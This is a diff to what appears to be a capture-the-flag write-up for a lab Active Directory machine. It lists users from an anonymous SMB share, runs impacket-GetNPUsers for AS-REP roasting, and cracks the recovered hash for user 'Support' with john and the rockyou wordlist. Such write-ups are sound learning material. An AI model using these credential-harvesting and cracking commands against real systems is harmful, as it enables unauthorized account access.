@@ -126,7 +126,6 @@ smb: \> ls
 Seems like we found a list of users, its possible to generate a list with the following command:
 ```
 ❯ smbclient -N \\\\10.129.229.17\\profiles$ -c ls | awk '{ print $1 }' > userlist.txt
-
 ```
 ---
 
@@ -136,7 +135,17 @@ With the acquired user list, we can attempt to run `Impacket-GetNPUsers` to find
 ```
 ❯ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile userlist.txt -dc-ip 10.129.229.17
 ```
+We found that the user `Support` has no pre-auth required
 
+![](../assets/images/Pasted%20image%2020260123184759.png)
+
+We create a new .txt file that contains the hash and attempt to crack with `john`
+
+```
+❯ john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![](../assets/images/Pasted%20image%2020260123185147.png)
 
 
 
